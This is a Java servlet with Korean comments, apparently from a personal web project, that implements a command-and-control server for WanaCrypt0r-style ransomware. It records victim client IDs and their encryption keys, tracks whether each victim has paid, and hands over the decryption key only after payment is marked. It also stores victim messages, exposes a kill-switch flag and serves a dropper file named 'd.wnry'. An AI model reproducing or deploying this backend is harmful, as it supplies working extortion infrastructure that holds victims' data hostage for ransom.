package kro.kr.rhya_network.servlet;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.sql.SQLException;
import java.util.UUID;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.codec.binary.Base64;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import kro.kr.rhya_network.logger.GetClientIPAddress;
import kro.kr.rhya_network.logger.RhyaLogger;
import kro.kr.rhya_network.page.JspPageInfo;
import kro.kr.rhya_network.security.RhyaAES;
import kro.kr.rhya_network.util.JSPUtilsInitTask;
import kro.kr.rhya_network.util.PathManager;
import kro.kr.rhya_network.util.ServiceAccessChecker;
import kro.kr.rhya_network.utils.db.DatabaseManager;

/**
 * Servlet implementation class WanaCrypt0rManager
 */
@WebServlet("/wanacrypt0r_manager")
public class WanaCrypt0rManager extends HttpServlet {
	private static final long serialVersionUID = 1L;
	// JSON 반환 결과
	private final String successMessage = "success";
	private final String failMessage = "fail";
	
	
	
	
    /**
     * @see HttpServlet#HttpServlet()
     */
    public WanaCrypt0rManager() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#service(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		
		// Rhya 로거 변수 선언
		RhyaLogger rl = new RhyaLogger();
		// Rhya 로거 설정
		rl.JspName = request.getServletPath();
		rl.LogConsole = true;
		rl.LogFile = true;
		
		
		// 클라이언트 IP
		String clientIP = GetClientIPAddress.getClientIp(request);
		
		
		// JSON 결과
		final String keyName_Result = "result";
		final String keyName_Message = "message";
		// JSON 변수
		Gson gson = new Gson();
		JsonObject obj = new JsonObject();

		
		// DB 관리자 선언
		DatabaseManager.DatabaseConnection databaseConnection = new DatabaseManager.DatabaseConnection();
		databaseConnection.init();
		
		
		// 전체 예외 처리
		try {
			// 페이지 초기화
			JSPUtilsInitTask jspUtilsInitTask = new JSPUtilsInitTask();
			if (jspUtilsInitTask.initTask(rl, request, response, JspPageInfo.PageID_Rhya_Utaite_Player)) { // 페이지 초기화 성공
				// DB 접속
				try {
					databaseConnection.init();
					databaseConnection.connection();
				} catch (ClassNotFoundException | SQLException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					
					databaseConnection = null;
					
					// 로그 출력
					rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "데이터베이스 연결 중 오류 발생! ", e.toString()));
				}
				
				
				// Null 확인
				if (databaseConnection != null) {
					// Main 파라미터 추출
					int inputMode = Integer.parseInt(request.getParameter("mode"));
					// 로그 출력
					rl.Log(RhyaLogger.Type.Debug, rl.CreateLogTextv8(clientIP, "클라이언트가 해당 파라미터로 접속함 Mode:", Integer.toString(inputMode)));
					
					// 페이지 접근 확인
					if (!new ServiceAccessChecker().isAccessService(0)) {
						// 로그 출력
						rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv5(clientIP, "서비스 접근 차단됨!"));
						
						obj.addProperty(keyName_Result, "service_access_block");
						
						PrintWriter out = response.getWriter(); 
						out.println(gson.toJson(obj));
						
						databaseConnection.allClose();
						
						return;
					}
					
					// 파라미터 구분
					switch (inputMode) {
						/**
						 * 알 수 없는 명령어
						 */
						default: {
							// 로그 출력
							rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "입력한 명령을 분석할 수 없습니다. Mode:", Integer.toString(inputMode)));
							
							obj.addProperty(keyName_Result, failMessage);
							obj.addProperty(keyName_Message, URLEncoder.encode("알 수 명령입니다. mode 파라미터를 확인해 주세요.", "UTF-8"));
							
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r 관리 모드 : 0
						 * 
						 * 설명 :
						 * 		클라이언트 정보 저장
						 * 
						 * 파라미터 :
						 * 		enckey      --> 암화 키
						 */
						case 0: {
							String encryptKey = request.getParameter("enckey");

							UUID uuid = UUID.randomUUID();
							
							databaseConnection.setPreparedStatement("INSERT INTO wanacry_client_info(client_id, encrypt_key) VALUE (?, ?);");
							databaseConnection.getPreparedStatement().setString(1, uuid.toString());
							databaseConnection.getPreparedStatement().setString(2, encryptKey);
							databaseConnection.executeUpdate();
							
							// JSON 데이터 설정
							obj.addProperty(keyName_Result, successMessage);
							obj.addProperty("client_id", URLEncoder.encode(uuid.toString(), "UTF-8"));
							obj.addProperty("encrypt_key", URLEncoder.encode(RhyaAES.AES_Encode(encryptKey), "UTF-8"));
							// 로그 출력
							rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 클라이언트 정보 등록 성공! / Client ID: ", encryptKey));
							
							// JSON 데이터 출력
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r 관리 모드 : 1
						 * 
						 * 설명 :
						 * 		클라이언트 정보 출력
						 * 
						 * 파라미터 :
						 * 		clientid    --> 클라이언트 ID
						 */
						case 1: {
							String clientID = request.getParameter("clientid");

							databaseConnection.setPreparedStatement("SELECT * FROM wanacry_client_info WHERE client_id = ?;");
							databaseConnection.getPreparedStatement().setString(1, clientID);
							databaseConnection.setResultSet();
							
							if (databaseConnection.getResultSet().next()) {
								// JSON 데이터 설정
								obj.addProperty(keyName_Result, successMessage);
								obj.addProperty("encrypt_date", URLEncoder.encode(databaseConnection.getResultSet().getString("encrypt_date"), "UTF-8"));
								obj.addProperty("is_payment", databaseConnection.getResultSet().getInt("is_payment"));
								
								// 로그 출력
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 클라이언트 정보 출력 성공! / Client ID: ", clientID));
							}else {
								// JSON 데이터 설정
								obj.addProperty(keyName_Result, failMessage);
								
								// 로그 출력
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 클라이언트 정보 출력 실패! / Client ID: ", clientID));
							}
							
							// JSON 데이터 출력
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r 관리 모드 : 2
						 * 
						 * 설명 :
						 * 		클라이언트 메시지 전송
						 * 
						 * 파라미터 :
						 * 		clientid    --> 클라이언트 ID
						 * 		message     --> 메시지 [ Base64 Encode ]
						 */
						case 2: {
							String clientID = request.getParameter("clientid");
							String message = request.getParameter("message");

							message = URLDecoder.decode(message, "UTF-8");

							databaseConnection.setPreparedStatement("INSERT INTO wanacry_client_message(client_id, message) VALUE (?, ?);");
							databaseConnection.getPreparedStatement().setString(1, clientID);
							databaseConnection.getPreparedStatement().setString(2, new String(Base64.decodeBase64(message), "UTF-8"));
							databaseConnection.executeUpdate();
							
							// JSON 데이터 설정
							obj.addProperty(keyName_Result, successMessage);
							
							// 로그 출력
							rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 클라이언트 정보 출력 성공! / Client ID: ", clientID));
							
							// JSON 데이터 출력
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r 관리 모드 : 3
						 * 
						 * 설명 :
						 * 		클라이언트 암호화 키 출력
						 * 
						 * 파라미터 :
						 * 		clientid    --> 클라이언트 ID
						 */
						case 3: {
							String clientID = request.getParameter("clientid");

							databaseConnection.setPreparedStatement("SELECT * FROM wanacry_client_info WHERE client_id = ?;");
							databaseConnection.getPreparedStatement().setString(1, clientID);
							databaseConnection.setResultSet();
							
							if (databaseConnection.getResultSet().next()) {
								if (databaseConnection.getResultSet().getInt("is_payment") == 1) {
									// JSON 데이터 설정
									obj.addProperty(keyName_Result, successMessage);
									obj.addProperty("encrypt_key", databaseConnection.getResultSet().getString("encrypt_key"));
									
									// 로그 출력
									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 클라이언트 암호화 키 출력 성공! / Client ID: ", clientID));
								}else {
									// JSON 데이터 설정
									obj.addProperty(keyName_Result, failMessage);
									
									// 로그 출력
									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "출력 실패! 해당 클라이언트는 아직 지불 확인이 되지 않았습니다. / Client ID: ", clientID));
								}
							}else {
								// JSON 데이터 설정
								obj.addProperty(keyName_Result, failMessage);
								
								// 로그 출력
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 클라이언트 암호화 키 출력 실패! / Client ID: ", clientID));
							}
							// JSON 데이터 출력
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r 관리 모드 : 4
						 * 
						 * 설명 :
						 * 		Kill-Switch 확인
						 * 
						 * 파라미터 :
						 * 		<없음>
						 */
						case 4: {
							databaseConnection.setPreparedStatement("SELECT service_online_wanacry_kill_switch FROM rhya_network_info;");
							databaseConnection.setResultSet();
							
							if (databaseConnection.getResultSet().next()) {
								// JSON 데이터 설정
								obj.addProperty(keyName_Result, successMessage);
								obj.addProperty("message", databaseConnection.getResultSet().getInt("service_online_wanacry_kill_switch") == 1);
								
								// 로그 출력
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r Kill-Switch 출력 성공!"));
							}else {
								// JSON 데이터 설정
								obj.addProperty(keyName_Result, failMessage);
								
								// 로그 출력
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r Kill-Switch 출력 실패!"));
							}
							// JSON 데이터 출력
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r 관리 모드 : 5
						 * 
						 * 설명 :
						 * 		WanaCrypt0r 파일 다운로드
						 * 
						 * 파라미터 :
						 * 		<없음>
						 */
						case 5: {
							// 파일 업로드된 경로
						    final String root = PathManager.WANACRY_ROOT_PATH;
						    // 실제 내보낼 파일명
						    String orgfilename = "d.wnry";    
							try {
								File file = new File(root, "drop_resources.zip");
								if (file.isFile()) {
									byte b[] = new byte[(int) file.length()];
									orgfilename = java.net.URLEncoder.encode(orgfilename, "UTF-8");
									response.setHeader("Content-Disposition", "attachment;filename=".concat(orgfilename));
									response.setHeader("Content-Type", "application/octet-stream; charset=utf-8");
									response.setContentLength((int) file.length());
									
									BufferedInputStream fin = new BufferedInputStream(new FileInputStream(file));
									BufferedOutputStream outs = new BufferedOutputStream(response.getOutputStream());
									int read = 0;
									while ((read = fin.read(b)) != -1) {
										outs.write(b, 0, read);
									}
									outs.close();
									fin.close();
									
									// 로그 출력
									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r 'd.wnry' 파일 다운로드 성공!"));
								} else {
									// 로그 출력
									rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv5(clientIP, "WanaCrypt0r 'd.wnry' 파일 다운로드 실패! File does not exist!"));
									
									obj.addProperty(keyName_Result, failMessage);
								}
							} catch (IOException e) {
								// 로그 출력
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 'd.wnry' 파일 다운로드 실패! 알 수 없는 오류가 발생하였습니다.", e.toString()));
								
								obj.addProperty(keyName_Result, failMessage);
							}
							
							
							// JSON 데이터 출력
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
					}
				}
			}else { // 페이지 초기화 실패
				obj.addProperty(keyName_Result, failMessage);
				
				rl.Log(RhyaLogger.Type.Error, rl.CreateLogTextv5(clientIP, "JSP 페이지 초기화 중 오류가 발생하였습니다."));
			}
		}catch (Exception e) {
			e.printStackTrace();
			
			obj.addProperty(keyName_Result, "ROOT_ERROR");
			PrintWriter out = response.getWriter(); 
			out.println(gson.toJson(obj));
			
			// 로그 출력
			rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "알 수 없는 오류 발생!", e.toString()));
		}
		
		
		// DB 연결 해제
		try {
			if (databaseConnection != null) 
				databaseConnection.allClose();
		}catch (SQLException e) {
			e.printStackTrace();
			
			// 로그 출력
			rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "데이터베이스 연결 해제 오류 발생! ", e.toString()));
		}
	}

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		response.getWriter().append("Served at: ").append(request.getContextPath());
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		doGet(request, response);
	}

}
